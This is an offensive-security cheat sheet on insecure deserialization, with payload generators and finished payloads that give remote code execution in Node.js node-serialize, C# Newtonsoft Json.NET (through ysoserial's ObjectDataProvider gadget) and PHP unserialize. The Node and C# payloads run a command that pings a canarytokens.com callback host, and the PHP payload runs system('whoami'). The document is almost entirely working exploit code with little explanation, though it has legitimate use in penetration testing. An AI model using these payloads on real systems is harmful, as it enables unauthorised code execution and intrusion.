# Object Deserialization
## Node.JS - node-serialize
Payload Generator:
```sh
let y = {
  rce: function() {
    require('child_process').exec('ping XXXXXXXXX.canarytokens.com', function(error, stdout, stderr) { console.log(stdout); });
  },
};

let serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```
Run:
```sh
node serialize.js

# You should add IIFE brackets "()" at the end of output. 
```

Payload:
```sh
{"rce":"_$$ND_FUNC$$_function() {require('child_process').exec('ping XXXXXXXXX.canarytokens.com', (error, stdout, stderr) => { console.log(stdout); }); } ()"}
```
#####

## C# - Newtonsoft
Run:
```sh
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 3   XXXXXXXXX.canarytokens.com"
```

Payload:
```sh
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', 'ping -n 3   XXXXXXXXX.canarytokens.com']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
#####

## PHP - serialize
Payload Generator:
```sh
<?php

class Example2
{  
   private $hook = "system('whoami');";
}

print(urlencode(serialize(new Example2)) . "\n\n");
print((serialize(new Example2)) . "\n");

?>
```

Run:
```sh
php serialize.php
```

Payload:
```sh
O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Example2%00hook%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D

O:8:"Example2":1:{s:14:"Example2hook";s:17:"system('whoami');";} 
```
#####

